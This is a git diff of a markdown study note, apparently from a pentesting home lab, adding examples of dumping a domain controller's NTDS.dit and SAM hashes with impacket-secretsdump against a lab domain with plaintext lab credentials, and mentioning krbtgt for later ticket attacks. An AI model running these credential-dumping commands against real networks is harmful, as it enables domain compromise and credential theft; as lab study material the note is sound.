@@ -18,6 +18,18 @@ An extremely critical and highly sensitive database used to store AD data within
 * security dscriptors
 * password hashes
 
-Using a **known domain admin account** we could use secretsdump and its switch of **-just-dc-ntlm** to dump out the DCs NTDS file. A successful Domain dump will contain a range of information from: SAM, credentials, domains, krbtgt, hashes, local account users, pc logins, and other accounts that may of been created from ipv6 / relayx mitm6 relay attack.  
+Using a **known domain admin account** we could use secretsdump and its switch of **-just-dc-ntlm** to dump out the DCs NTDS file. A successful Domain dump will contain a range of information from: SAM, credentials, domains, krbtgt, hashes, local account users, pc logins, and other accounts that may of been created from ipv6 / relayx + mitm6 relay attack.  
 
-impacket-secretsdump / secretsdump 'impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168. continue here
+example:
+
+    impacket-secretsdump / secretsdump 'impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168.64.139 -just-dc-ntlm
+
+using our malicious domain admin account hawkeye against the DC, we succesfully dump the local SAM and more importantly NTDS.dit file. From the dump we also see 'kerberos keys' and also the krbtgt which could be later leveraged in a kerberos ticket attack.
+
+    impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138
+
+![image](https://github.com/user-attachments/assets/dfe18c4b-7172-4012-8155-1c74bbd42f97)
+
+Using -just-dc-ntlm with secrets dump  
+
+  impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
